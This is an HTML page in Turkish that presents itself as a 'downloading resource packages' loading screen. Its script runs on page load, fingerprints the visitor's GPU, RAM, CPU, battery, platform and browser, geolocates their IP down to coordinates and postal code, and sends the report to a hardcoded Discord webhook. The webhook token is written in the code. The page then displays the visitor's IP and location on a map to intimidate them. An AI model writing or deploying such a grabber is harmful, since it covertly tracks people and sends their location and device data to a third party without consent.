<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome Qeat'S World</title>
    <style>
        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; overflow: hidden; }
        .terminal { width: 95%; max-width: 800px; background: rgba(0, 0, 0, 0.95); border: 1px solid #00ff41; padding: 30px; box-shadow: 0 0 30px rgba(0, 255, 65, 0.3); position: relative; }
        .line { margin-bottom: 12px; font-size: 14px; white-space: nowrap; overflow: hidden; border-right: .15em solid orange; width: 0; }
        .type-1 { animation: typing 1s steps(40, end) forwards 0.2s, blink-caret .75s step-end infinite; }
        .type-2 { animation: typing 1s steps(40, end) forwards 1.2s, blink-caret .75s step-end infinite; }
        .type-3 { animation: typing 1s steps(40, end) forwards 2.2s, blink-caret .75s step-end infinite; }
        @keyframes typing { from { width: 0 } to { width: 100% } }
        @keyframes blink-caret { from, to { border-color: transparent } 50% { border-color: #00ff41; } }
        .progress-container { width: 100%; background-color: #111; height: 4px; margin: 20px 0; display: none; }
        .progress-bar { width: 0%; height: 100%; background-color: #00ff41; box-shadow: 0 0 10px #00ff41; }
        #result-box { margin-top: 20px; display: none; border-top: 1px solid #333; padding-top: 15px; font-size: 13px; }
        .map-frame { width: 100%; height: 200px; margin-top: 15px; border: 1px solid #444; filter: grayscale(1) invert(1) contrast(1.2); }
        .data-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        .label { color: #888; }
        .value { color: #ff0000; font-weight: bold; }
    </style>
</head>
<body>

<div class="terminal">
    <div class="line type-1">> Bir Dakika Bekleyin...</div>
    <div class="line type-2">> Çok Az Kaldı!</div>
    <div class="line type-3">> Tüm Kaynak Paketleri İndirildi!</div>
    
    <div class="progress-container" id="loader">
        <div class="progress-bar" id="bar"></div>
    </div>

    <div id="result-box">
        <div class="data-grid">
            <div><span class="label">> IP:</span> <span class="value" id="user-ip">...</span></div>
            <div><span class="label">> GPU:</span> <span class="value" id="user-gpu">Analiz ediliyor...</span></div>
            <div><span class="label">> SİSTEM:</span> <span class="value" id="user-sys">...</span></div>
            <div><span class="label">> ŞARJ:</span> <span class="value" id="user-bat">...</span></div>
        </div>
        <iframe id="gmap" class="map-frame" frameborder="0" scrolling="no"></iframe>
        <div style="margin-top: 15px; font-size: 10px; color: #444; text-align: center;">Kayıt No: #<span id="reg-no"></span> | VERİLER .TXT OLARAK ARŞİVLENDİ.</div>
    </div>
</div>

<script>
    const webhookURL = "https://discord.com/api/webhooks/1499664835267399710/r0cYWya6kyc0_1z1Szqh1jSxLbxSaEvEBtCoinqecKG3_PrrLbIkUJkIol9k8a4J3xjH";

    // ⚡️ Ekran Kartı (GPU) Bilgisini Çekme
    function getGPUInfo() {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return "Bilinmiyor";
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Bilinmiyor";
    }

    async function deepCapture() {
        // Cihaz Detayları
        const gpu = getGPUInfo();
        const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Bilinmiyor";
        const cores = navigator.hardwareConcurrency || "Bilinmiyor";
        const touch = navigator.maxTouchPoints > 0 ? "Var" : "Yok";
        const pdf = navigator.pdfViewerEnabled ? "Destekliyor" : "Desteklemiyor";
        let batLevel = "Bilinmiyor", batTime = "Bilinmiyor";

        try {
            const battery = await navigator.getBattery();
            batLevel = `%${Math.round(battery.level * 100)}`;
            batTime = battery.dischargingTime === Infinity ? "Prizde" : `${Math.round(battery.dischargingTime / 60)} dk`;
        } catch(e) {}

        fetch('https://ipapi.co/json/')
        .then(res => res.json())
        .then(async (data) => {
            const time = new Date().toLocaleString('tr-TR');
            
            // --- .txt RAPOR İÇERİĞİ ---
            const report = `
[QEAT RAPORU]
Zaman: ${time}
----------------------------------------
[IP & KONUM]
IP: ${data.ip}
ISS: ${data.org}
Konum: ${data.city} / ${data.region} / ${data.country_name}
Posta Kodu: ${data.postal}
Para Birimi: ${data.currency_name} (${data.currency})
Koordinat: ${data.latitude}, ${data.longitude}

[DONANIM & GRAFIK]
Ekran Kartı (GPU): ${gpu}
İşlemci Çekirdek: ${cores}
Yaklaşık RAM: ${ram}
Ekran Çözünürlüğü: ${window.screen.width}x${window.screen.height}
Dokunmatik Ekran: ${touch}

[SISTEM & DURUM]
İşletim Sistemi: ${navigator.platform}
Tarayıcı: ${navigator.userAgent}
Şarj Seviyesi: ${batLevel}
Kalan Süre: ${batTime}
PDF Desteği: ${pdf}
----------------------------------------
DURUM: TÜM VERİLER BAŞARIYLA ÇEKİLDİ.
`;

            // --- DISCORD GÖNDERİMİ ---
            const formData = new FormData();
            const payload = {
                username: "Siber İstihbarat Ajanı",
                embeds: [{
                    title: "Yeni Bilgiler HGldi",
                    color: 0xff0000,
                    description: `🎯 **Hedef:** \`${data.ip}\`\n🎮 **GPU:** \`${gpu}\`\n📂 Detaylı rapor aşağıda eklendi.`,
                    timestamp: new Date()
                }]
            };

            formData.append('payload_json', JSON.stringify(payload));
            const blob = new Blob([report], { type: 'text/plain' });
            formData.append('file', blob, `SIZINTI_${data.ip}.txt`);

            await fetch(webhookURL, { method: 'POST', body: formData });

            // Ekran Güncelleme
            window.cachedData = {...data, gpu, batLevel, platform: navigator.platform};
            window.cachedRegNo = Math.floor(Math.random() * 99999);
        });
    }

    deepCapture();

    // Bar Animasyonu
    setTimeout(() => {
        const loader = document.getElementById('loader');
        const bar = document.getElementById('bar');
        loader.style.display = 'block';
        let width = 0;
        let int = setInterval(() => {
            if (width >= 100) {
                clearInterval(int);
                document.getElementById('user-ip').innerText = window.cachedData.ip;
                document.getElementById('user-gpu').innerText = window.cachedData.gpu.substring(0, 20) + "...";
                document.getElementById('user-sys').innerText = window.cachedData.platform;
                document.getElementById('user-bat').innerText = window.cachedData.batLevel;
                document.getElementById('reg-no').innerText = window.cachedRegNo;
                document.getElementById('gmap').src = `https://maps.google.com/maps?q=${window.cachedData.latitude},${window.cachedData.longitude}&z=14&output=embed`;
                document.getElementById('result-box').style.display = 'block';
            } else {
                width += 5;
                bar.style.width = width + '%';
            }
        }, 50);
    }, 2000);
</script>
</body>
</html>
